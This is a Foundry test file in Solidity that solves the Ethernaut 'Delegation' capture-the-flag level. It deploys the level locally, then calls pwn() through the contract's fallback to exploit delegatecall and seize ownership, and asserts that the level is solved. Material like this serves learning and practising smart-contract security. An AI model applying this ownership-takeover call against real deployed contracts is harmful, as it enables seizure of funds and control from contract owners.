// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

import {Test, console} from "forge-std/Test.sol";
import {Ethernaut} from "../src/core/Ethernaut.sol";
import {DelegationFactory} from "../src/06-Delegation/DelegationFactory.sol";

contract DelegationTest is Test {
    Ethernaut public ethernaut;
    address public user = vm.addr(1);

    function setUp() public {
        ethernaut = new Ethernaut();
    }

    function test_DelegationAttack() public {
        // SETUP
        DelegationFactory delegationFactory = new DelegationFactory();
        ethernaut.registerLevel(delegationFactory);
        vm.startPrank(user);
        address levelAddress = ethernaut.createLevelInstance(delegationFactory);

        // ATTACK
        levelAddress.call(abi.encodeWithSignature("pwn()"));

        // SUBMIT
        assertTrue(ethernaut.submitLevelInstance(payable(levelAddress)), "level not solved");
        vm.stopPrank();
    }
}
